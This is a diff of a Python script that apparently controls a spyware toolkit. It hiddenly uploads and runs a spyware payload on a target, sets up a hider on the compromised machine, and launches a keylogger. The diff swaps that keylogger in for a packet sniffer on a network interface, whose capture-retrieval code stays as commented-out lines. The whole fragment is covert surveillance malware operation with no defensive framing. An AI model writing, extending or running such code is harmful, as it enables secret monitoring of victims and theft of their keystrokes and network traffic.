@@ -55,7 +55,7 @@ def main():
         manegerAgent.hidden_action_with_upload(
             FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
             "spyware",
-            "sentSpyware9.spy",
+            "sentSpyware17.spy",
         )
     )
     while op.spyAgent is None:
@@ -63,11 +63,14 @@ def main():
     spyAgent: Agent = op.spyAgent
 
     print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))
-
-    params = ContParams(SnifferType, Params(SniffParams(20, b"ens33")))
-    print(spyAgent.runContraption(params, 10))
-    sleep(30)
-    print(spyAgent.retrieve_file("0.sniff"))
+    kligPar = Params()
+    kligPar.kligP = kligPrams(40)
+    kligP = ContParams(KligerType, kligPar)
+    print(spyAgent.runContraption(kligP, 10))
+    # sniffP = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
+    # print(spyAgent.runContraption(sniffP, 10))
+    # sleep(30)
+    # print(spyAgent.retrieve_file("0.sniff").decode("utf-8"))
 
 
 if __name__ == "__main__":
